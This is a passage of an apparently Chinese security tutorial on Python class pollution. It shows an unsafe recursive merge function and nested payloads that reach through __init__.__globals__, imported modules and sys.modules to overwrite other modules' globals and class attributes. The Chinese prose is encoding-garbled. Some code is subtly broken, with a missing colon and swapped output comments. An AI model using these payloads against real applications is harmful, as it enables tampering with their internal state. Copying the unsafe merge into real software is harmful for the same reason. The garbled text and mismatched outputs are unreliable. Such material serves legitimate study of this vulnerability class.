</h2><p>Âú®‰ª£Á†ÅÂ±ïÁ§∫ÈÉ®ÂàÜÊâÄÁªôÂá∫ÁöÑ‰æãÂ≠ê‰∏≠ÔºåÊ±°ÊüìÁ±ªÂ±ûÊÄßÊòØÈÄöËøáÁ§∫‰æãÁöÑ<code>__base__</code>Â±ûÊÄßÊü•ÊâæÂà∞ÂÖ∂ÁªßÊâøÁöÑÁà∂Á±ªÔºå‰ΩÜÊòØÂ¶ÇÊûúÁõÆÊ†áÁ±ª‰∏éÂàáÂÖ•ÁÇπÁ±ªÊàñÂÆû‰æãÊ≤°ÊúâÁªßÊâøÂÖ≥Á≥ªÊó∂ÔºåËøôÁßçÊñπÊ≥ïÂ∞±ÊòæÂæóÂçÅÂàÜÊó†Âäõ</p>
<h3 id="ÂÖ®Â±ÄÂèòÈáèËé∑Âèñ">ÂÖ®Â±ÄÂèòÈáèËé∑Âèñ
</h3><p>Âú®<code>Python</code>‰∏≠ÔºåÂáΩÊï∞ÊàñÁ±ªÊñπÊ≥ïÔºàÂØπ‰∫éÁ±ªÁöÑÂÜÖÁΩÆÊñπÊ≥ïÂ¶Ç<code>__init__</code>Ëøô‰∫õÊù•ËØ¥ÔºåÂÜÖÁΩÆÊñπÊ≥ïÂú®Âπ∂Êú™ÈáçÂÜôÊó∂ÂÖ∂Êï∞ÊçÆÁ±ªÂûã‰∏∫Ë£ÖÈ•∞Âô®Âç≥<code>wrapper_descriptor</code>ÔºåÂè™ÊúâÂú®ÈáçÂÜôÂêéÊâçÊòØÂáΩÊï∞<code>function</code>ÔºâÂùáÂÖ∑Êúâ‰∏Ä‰∏™<code>__globals__</code>Â±ûÊÄßÔºåËØ•Â±ûÊÄßÂ∞ÜÂáΩÊï∞ÊàñÁ±ªÊñπÊ≥ïÊâÄÁî≥ÊòéÁöÑÂèòÈáèÁ©∫Èó¥‰∏≠ÁöÑÂÖ®Â±ÄÂèòÈáè‰ª•Â≠óÂÖ∏ÁöÑÂΩ¢ÂºèËøîÂõûÔºàÁõ∏ÂΩì‰∫éËøô‰∏™ÂèòÈáèÁ©∫Èó¥‰∏≠ÁöÑ<code>globals</code>ÂáΩÊï∞ÁöÑËøîÂõûÂÄºÔºâ„ÄÇÂÖ∑‰ΩìÊù•ËØ¥Â∞±ÊòØÔºå<code>__globals__</code> Â±ûÊÄßËøîÂõû‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÈáåÈù¢ÂåÖÂê´‰∫ÜÂáΩÊï∞ÂÆö‰πâÊó∂ÊâÄÂú®Ê®°ÂùóÁöÑÂÖ®Â±ÄÂèòÈáè„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test</span><span class="o">.</span><span class="vm">__globals__</span> <span class="o">==</span> <span class="nb">globals</span><span class="p">()</span> <span class="o">==</span> <span class="n">a</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#True</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá<code>__globals__</code>Êù•Ëé∑ÂèñÂà∞ÂÖ®Â±ÄÂèòÈáèÔºåËøôÊ†∑Â∞±ÂèØ‰ª•‰øÆÊîπÊó†ÁªßÊâøÂÖ≥Á≥ªÁöÑÁ±ªÂ±ûÊÄßÁîöËá≥ÂÖ®Â±ÄÂèòÈáè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">a</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_class_var</span> <span class="o">=</span> <span class="s2">&#34;secret&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;a&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Pooooluted ~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#secret</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#114</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Pooooluted ~</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#514</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Â∑≤Âä†ËΩΩÊ®°ÂùóËé∑Âèñ">Â∑≤Âä†ËΩΩÊ®°ÂùóËé∑Âèñ
</h3><p>Â±ÄÈôê‰∫éÂΩìÂâçÊ®°ÂùóÁöÑÂÖ®Â±ÄÂèòÈáèËé∑ÂèñÊòæÁÑ∂‰∏çÂ§üÔºåÂæàÂ§öÊÉÖÂÜµ‰∏ãÈúÄË¶ÅÂØπÂπ∂‰∏çÊòØÂÆö‰πâÂú®ÂÖ•Âè£Êñá‰ª∂‰∏≠ÁöÑÁ±ªÂØπË±°ÊàñËÄÖÂ±ûÊÄßÔºåËÄåÊàë‰ª¨ÁöÑÊìç‰Ωú‰ΩçÁΩÆÂèàÂú®ÂÖ•Âè£Êñá‰ª∂‰∏≠ÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ÈúÄË¶ÅÂØπÂÖ∂‰ªñÂä†ËΩΩËøáÁöÑÊ®°ÂùóÊù•Ëé∑Âèñ‰∫Ü</p>
<h4 id="importÂä†ËΩΩËé∑Âèñ">importÂä†ËΩΩËé∑Âèñ
</h4><p>Âú®Âä†ËΩΩÂÖ≥Á≥ªÁÆÄÂçïÁöÑÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•‰ªéÊñá‰ª∂ÁöÑ<code>import</code>ËØ≠Ê≥ïÈÉ®ÂàÜÊâæÂà∞ÁõÆÊ†áÊ®°ÂùóÔºåËøô‰∏™Êó∂ÂÄôÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáËé∑ÂèñÂÖ®Â±ÄÂèòÈáèÊù•ÂæóÂà∞ÁõÆÊ†áÊ®°ÂùóÔºåÂú®payload‰∏≠Êàë‰ª¨Âè™ÈúÄË¶ÅÂØπÂØπÂ∫îÁöÑÊ®°ÂùóÈáçÊñ∞ÂÆö‰ΩçÂ∞±ÂèØ‰ª•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#test.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">test_1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;test_1&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;target_class&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Poluuuuuuted ~&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#secret</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">target_class</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#114</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">secret_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#514</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">test_1</span><span class="o">.</span><span class="n">target_class</span><span class="o">.</span><span class="n">secret_class_var</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Poluuuuuuted ~</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#test_1.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret_var</span> <span class="o">=</span> <span class="mi">114</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">target_class</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_class_var</span> <span class="o">=</span> <span class="s2">&#34;secret&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="sysÊ®°ÂùóÂä†ËΩΩËé∑Âèñ">sysÊ®°ÂùóÂä†ËΩΩËé∑Âèñ
</h4><p>Âú®ÂæàÂ§öÁéØÂ¢ÉÂΩì‰∏≠Ôºå‰ºöÂºïÁî®Á¨¨‰∏âÊñπÊ®°ÂùóÊàñËÄÖÊòØÂÜÖÁΩÆÊ®°ÂùóÔºåËÄå‰∏çÊòØÁÆÄÂçïÁöÑimportÂêåÁ∫ßÊñá‰ª∂‰∏ãÈù¢ÁöÑÁõÆÂΩïÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±Ë¶ÅÂÄüÂä©sysÊ®°Âùó‰∏≠ÁöÑmoduleÂ±ûÊÄßÔºåËøô‰∏™Â±ûÊÄßËÉΩÂ§üÂä†ËΩΩÂá∫Êù•Âú®Ëá™ËøêË°åÂºÄÂßãÊâÄÊúâÂ∑≤Âä†ËΩΩÁöÑÊ®°ÂùóÔºå‰ªéËÄåÊàë‰ª¨ËÉΩÂ§ü‰ªéÂ±ûÊÄß‰∏≠Ëé∑ÂèñÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÊ±°ÊüìÁöÑÁõÆÊ†áÊ®°Âùó</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;sys&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;modules&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;test_1&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;secret_var&#34;</span> <span class="p">:</span> <span class="mi">514</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;target_class&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;secret_class_var&#34;</span> <span class="p">:</span> <span class="s2">&#34;Poluuuuuuted ~&#34;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂΩìÁÑ∂Êàë‰ª¨Âéª‰ΩøÁî®ÁöÑ<code>Payload</code>ÁªùÂ§ßÈÉ®ÂàÜÊÉÖÂÜµ‰∏ãÊòØ‰∏ç‰ºöËøôÊ†∑ÁöÑÔºåÂ¶Ç‰∏äÁöÑ<code>Payload</code>ÂÆûÈôÖ‰∏äÊòØÂú®Â∑≤Áªè<code>import sys</code>ÁöÑÊÉÖÂÜµ‰∏ã‰ΩøÁî®ÁöÑÔºåËÄåÂ§ßÈÉ®ÂàÜÊÉÖÂÜµÊòØÊ≤°ÊúâÁõ¥Êé•ÂØºÂÖ•ÁöÑÔºåËøôÊ†∑ÈóÆÈ¢òÂ∞±‰ªé<strong>ÂØªÊâæ<code>import</code>ÁâπÂÆöÊ®°ÂùóÁöÑËØ≠Âè•</strong>ËΩ¨Êç¢‰∏∫<strong>ÂØªÊâæ<code>import</code>‰∫ÜsysÊ®°ÂùóÁöÑËØ≠Âè•</strong>ÔºåÂØπÈóÆÈ¢òËß£ÂÜ≥ÁöÑÂπ∂‰∏çËßÅÂæóÊúâÂ§öÂ∞ë‰ºòÂåñ</p>
<h4 id="Âä†ËΩΩÂô®loaderËé∑Âèñ">Âä†ËΩΩÂô®loaderËé∑Âèñ
</h4><p>‰∏∫‰∫ÜËøõ‰∏ÄÊ≠•‰ºòÂåñÔºåËøôÈáåÈááÁî®ÊñπÂºèÊòØÂà©Áî®<code>Python</code>‰∏≠Âä†ËΩΩÂô®<code>loader</code>,ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØ‰∏∫ÂÆûÁé∞Ê®°ÂùóÂä†ËΩΩËÄåËÆæËÆ°ÁöÑÁ±ªÔºåÂÖ∂Âú®<code>importlib</code>Ëøô‰∏ÄÂÜÖÁΩÆÊ®°Âùó‰∏≠ÊúâÂÖ∑‰ΩìÂÆûÁé∞„ÄÇ‰ª§‰∫∫Â∫ÜÂπ∏ÁöÑÊòØ<code>importlib</code>Ê®°Âùó‰∏ãÊâÄÊúâÁöÑ<code>py</code>Êñá‰ª∂‰∏≠ÂùáÂºïÂÖ•‰∫Ü<code>sys</code>Ê®°Âùó</p>
<p>ËøôÊ†∑Êàë‰ª¨Âíå‰∏äÈù¢ÁöÑsysÊ®°ÂùóËé∑ÂèñÂ∑≤Âä†ËΩΩÊ®°ÂùóÂ∞±ËÅîÁ≥ªËµ∑Êù•‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑÁõÆÊ†áÂ∞±ÂèòÊàê‰∫ÜÂè™Ë¶ÅËé∑Âèñ‰∫ÜÂä†ËΩΩÂô®loaderÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá<code>loader.__init__.__globals__['sys']</code>Êù•Ëé∑ÂèñÂà∞sysÊ®°ÂùóÔºåÁÑ∂ÂêéÂÜçËé∑ÂèñÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊ®°Âùó„ÄÇ</p>
<p>Áé∞Âú®Â∞±ÊòØË¶ÅËé∑Âèñ<code>loader</code></p>
<p><code>__loader__</code>ÂÜÖÁΩÆÂ±ûÊÄß‰ºöË¢´ËµãÂÄº‰∏∫Âä†ËΩΩËØ•Ê®°ÂùóÁöÑ<code>loader</code>ÔºåËøôÊ†∑Âè™Ë¶ÅËÉΩËé∑ÂèñÂà∞‰ªªÊÑèÁöÑÊ®°Âùó‰æøËÉΩÈÄöËøá<code>__loader__</code>Â±ûÊÄßËé∑ÂèñÂà∞<code>loader</code>ÔºåËÄå‰∏îÂØπ‰∫é<code>python3</code>Êù•ËØ¥Èô§‰∫ÜÂú®<code>debug</code>Ê®°Âºè‰∏ãÁöÑ‰∏ªÊñá‰ª∂‰∏≠<code>__loader__</code>‰∏∫<code>None</code>‰ª•Â§ñÔºåÊ≠£Â∏∏ÊâßË°åÁöÑÊÉÖÂÜµÊØè‰∏™Ê®°ÂùóÁöÑ<code>__loader__</code>Â±ûÊÄßÂùáÊúâ‰∏Ä‰∏™ÂØπÂ∫îÁöÑÁ±ª</p>
<p>‰∏æ‰∏™‰æãÂ≠ê</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Ëé∑ÂèñÊ®°ÂùóÁöÑloader</span>
</span></span><span class="line"><span class="cl"><span class="n">loader</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">__loader__</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊâìÂç∞loader‰ø°ÊÅØ</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">loader</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
